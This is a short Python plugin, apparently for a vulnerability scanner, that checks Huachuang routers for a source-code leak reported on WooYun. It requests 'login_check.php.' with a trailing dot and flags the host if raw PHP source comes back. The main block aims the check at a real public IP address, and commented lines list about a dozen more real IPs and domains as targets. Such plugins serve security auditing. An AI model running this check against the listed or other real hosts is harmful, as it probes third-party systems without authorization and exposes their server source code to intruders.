#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#__refer__  = http://www.wooyun.org/bugs/wooyun-2010-0132543
'''
华创路由器源码泄露
'''
import urlparse
def assign(service, arg):
    if service == 'huachuang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    posturl =  "login_check.php."
    target = arg + posturl
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and "<?php" in res:
        security_hole(arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router', "http://218.28.194.190/")[1])
    # audit(assign('www', "https://118.26.68.4/")[1])
    # audit(assign('www', "https://124.117.212.54/")[1])
    # audit(assign('www', "http://221.238.229.42/")[1])
    # audit(assign('www', "http://211.103.235.166/")[1])
    # audit(assign('www', "https://124.65.132.74/")[1])
    # audit(assign('www', "http://118.26.68.2/")[1])
    # audit(assign('www', "http://211.103.235.168/")[1])
    # audit(assign('www', "https://118.26.68.7/")[1])
    # audit(assign('www', "https://rdfzsyxx.com/")[1])
    # audit(assign('www', "https://www.zclxx.com/")[1])
    # audit(assign('www', "https://118.26.68.5/")[1])